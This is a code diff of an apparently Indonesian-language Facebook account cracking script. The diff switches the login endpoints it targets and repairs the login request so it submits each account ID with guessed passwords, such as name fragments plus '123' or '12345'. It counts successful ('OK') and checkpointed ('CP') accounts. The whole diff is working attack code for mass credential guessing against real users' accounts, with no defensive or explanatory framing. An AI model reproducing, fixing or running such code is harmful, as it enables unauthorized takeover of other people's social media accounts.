@@ -615,13 +615,13 @@ def otomatis():
 					pwx.append(depan+"123")
 					pwx.append(depan+"12345")
 			if 'mobile' in metode:
-				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"p.facebook.com",awal)
 			elif 'mbasic' in metode:
 				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 			elif 'free' in metode:
-				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"d.facebook.com",awal)
 			else:
-				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 	sleep(5)
 	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
 				
@@ -640,7 +640,7 @@ def crack(idf,pwx,url,awal):
 	for pw in pwx:
 		try:
 			link = ses.get(f'https://{url}/login/?source=auth_switcher')
-			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)[0],"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1)[0],"next":"https://"+url+"/login/save-device/?login_source=login}
+			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)[0],"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1)[0],"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
 			hd2 = {"Host":url,
 				"cache-control":"max-age=0",
 				"upgrade-insecure-requests":"1",
